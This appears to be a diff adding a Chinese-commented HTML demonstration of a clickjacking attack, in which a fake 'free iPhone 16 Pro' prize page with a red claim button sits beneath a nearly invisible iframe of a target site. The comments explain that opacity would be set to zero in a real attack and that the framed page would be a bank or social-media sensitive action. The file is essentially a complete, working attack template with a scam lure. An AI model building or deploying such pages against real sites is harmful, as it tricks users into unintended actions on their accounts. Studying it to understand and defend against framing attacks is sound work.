@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>點擊劫持攻擊示範</title>
+    <style>
+        /* 攻擊者網頁的樣式 */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+
+        .underlying-content {
+            padding: 20px;
+            text-align: center;
+            background-color: #f0f0f0;
+            z-index: 1;
+        }
+
+        .fake-button {
+            padding: 15px 30px;
+            background-color: #ff4757;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            cursor: pointer;
+        }
+
+        /* 關鍵：覆蓋在上面的透明目標網站 (iframe) */
+        iframe {
+            position: absolute;
+            top: 50px;    /* 調整位置以對準下方的按鈕 */
+            left: 50%;
+            transform: translateX(-50%);
+            width: 500px;
+            height: 300px;
+            z-index: 2;   /* 確保在最上層 */
+            
+            /* 將透明度設為 0.1 方便你觀察，攻擊時會設為 0 */
+            opacity: 0.1; 
+            border: 1px solid red;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- 這是用戶看得到的內容 -->
+    <div class="underlying-content">
+        <h1>恭喜！你獲得了 iPhone 16 Pro</h1>
+        <p>請點擊下方按鈕立即領取獎品</p>
+        <button class="fake-button">立即領取免費獎品</button>
+    </div>
+
+    <!-- 這是用戶看不到，但實際會點擊到的目標網站 -->
+    <!-- 這裡以範例網址代替，實際攻擊中會是銀行或社群媒體的敏感操作頁面 -->
+    <iframe src="https://example.com"></iframe>
+
+</body>
+</html>
